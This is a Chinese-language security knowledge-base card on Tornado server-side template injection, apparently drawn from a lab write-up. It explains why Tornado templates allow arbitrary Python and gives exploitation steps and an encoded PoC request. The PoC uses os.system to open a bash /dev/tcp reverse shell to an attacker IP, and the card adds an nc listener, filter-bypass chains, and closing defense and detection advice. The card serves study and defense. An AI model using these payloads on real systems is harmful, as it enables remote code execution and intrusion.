---
id: web-python-ssti-tornado-import-os-system-rce
title: Tornado 模板注入：{% import os %}{{ os.system(...) }} 直接执行命令并反弹 shell
type: scenario
domain: web
path: web/python/ssti
technique: tornado-template-import-os-rce
aliases:
- Tornado SSTI
- Tornado 模板注入
- import os 模板注入
- Tornado render_string 注入
- name 参数模板注入
tags:
- python
- ssti
- tornado
- template-injection
- rce
- reverse-shell
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V622
  verified_at: '2026-11-12T22:09:45+08:00'
  notes: 已对照原文与全部20张图核对：图02 nmap 识别 9999/Tornado httpd 6.1；图13 页面为 Tell me your name buddy；图14 Burp 请求 name 参数值经 URL 编码为 {% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/192.168.84.128/4444 0>&1"')}}，与卡中 PoC 的 IP/端口/命令一致；图15 nc -lvnp 4444 收到 saket 用户 shell 并执行 id。原文黑盒确认 name 参数进入模板且未给模板源码，卡已如实说明。dedup 10候选全部 new，最近 jinja2-flask-globals(0.859)、noecho-dot-banned(0.848) 为不同引擎/黑名单场景，非同链；dup-scan 无涉及 pair。未验证点：未复现；Tornado 具体版本仅由 nmap banner 得出（6.1）。另注意原文正文把 page 参数写成 page_on，截图为 page_no，属靶场枚举笔误，与两卡无关。
---

## 一句话结论

用户输入被 Tornado 模板渲染时，Tornado 模板语法允许 `{% import module %}` 导入任意 Python 模块、`{{ expr }}` 求值任意表达式；提交 `{% import os %}{{ os.system('bash -c "..."') }}` 即可在服务端执行命令并反弹 shell——Tornado 模板默认没有沙箱。

## 原理

- Tornado 的模板引擎把模板编译成 Python 代码：`{% ... %}` 是语句块，`{{ ... }}` 是输出表达式，`{% import os %}` 会在模板命名空间中执行 Python import，`{{ os.system(...) }}` 直接调用该方法并把返回值写入输出。
- 与 Jinja2 不同，Tornado 模板从未设计安全沙箱：没有 `SandboxedEnvironment`，import/属性访问不受限制；只要用户输入进入了 `render_string`/`Template(...).generate` 的模板文本（而不是仅作为变量值），就能执行任意 Python。
- 本场景入口是一个“Tell me your name”的表单：name 参数被拼进模板，提交 `{% import os %}{{ os.system('...') }}` 触发命令执行；文章用 `bash -i >& /dev/tcp/<ip>/4444 0>&1` 反弹，URL 编码后发送。
- 为什么成立：模板注入的本质是“数据被当成代码”；Tornado 模板的语句块和表达式求值让攻击者获得 Python 执行能力，`os.system` 只是最直接的一条路径。

## 触发条件

- 应用使用 Tornado 模板引擎（响应头/错误页/默认页或 nmap 识别到 Tornado），且把用户输入作为模板文本渲染（字符串拼接/`render_string(user_input)`）。
- 模板渲染上下文没有做输入转义或白名单（Tornado 默认 `autoescape` 只影响 HTML 转义，不阻止模板语法）。
- 目标可出网或存在可写入/可回显的通道用于验证命令执行。

## 利用步骤

1. 识别引擎：Tornado 模板使用 `{% %}`/`{{ }}`，错误页/响应头常见 `Tornado`；也可用 `${1+abcxyz}`、`{%1+abcxyz%}` 等探针观察渲染差异。
2. 验证执行：提交 `{% import os %}{{ os.system('id') }}`，观察命令输出是否进入响应。
3. 构造反弹 shell 并 URL 编码：
   `{% import os %}{{ os.system('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"') }}`
4. 攻击端 `nc -lvnp 4444` 接收 shell，确认 `id`。
5. 若 import 被过滤，改用内置对象链（`__import__('os')`、`__builtins__`、`globals()` 等）或 tornado 的 `settings`/`handler` 对象。

## PoC

```http
GET /?name=%7B%25import+os%25%7D%7B%7Bos.system('bash+-c+"bash+-i+%3E%26+/dev/tcp/192.168.84.128/4444+0%3E%261"')%7D%7D HTTP/1.1
Host: target:9999
```

解码后的模板：

```text
{% import os %}{{ os.system('bash -c "bash -i >& /dev/tcp/192.168.84.128/4444 0>&1"') }}
```

```bash
# 攻击端
nc -lvnp 4444
# 收到 shell 后
id
```

说明：原文在端口 9999 的 Tornado 应用上验证成功并拿到 saket 用户 shell；未给出模板源码，入口为 name 参数。

## 变体与关联

- 变体：`{% import subprocess %}{{ subprocess.check_output(...) }}`、`{% import os %}{{ os.popen('id').read() }}`；无回显时写文件/出网外带。
- 变体：禁用 import 时用 `{{ ''.__class__.__mro__[1].__subclasses__() }}` 等 Python 对象链，或 Tornado handler 的 `self`/`handler.settings` 上下文对象。
- 关联：[[web-generic-ssti-engine-identification-decision-tree-errors]]（含 Tornado 定界符识别）、[[web-python-ssti-noecho-dot-banned-request-params-exec-reverse-shell]]（无回显时出网）、[[web-python-ssti-flask-source-read-waf-blacklist-driven-payload]]（同类 Python 引擎黑名单绕过思路）。
- 边界：用户输入仅作为模板变量值（`{{ name }}`）而非模板文本时不成立；引擎实际为 Jinja2/Mako 时需改用对应语法。

## 检测与防御

- 不要把用户输入拼进模板文本；变量通过 `{{ name }}` 渲染并保持 autoescape。
- 需要动态模板时使用沙箱化引擎/受限表达式，或只允许白名单模板片段。
- 检测：请求参数中出现 `{%`、`{{`、`import os`、`os.system`、`/dev/tcp` 等模板/命令特征；WAF 对模板定界符做告警。
- 响应：检测到后立即隔离出网、轮换凭据并排查横向。
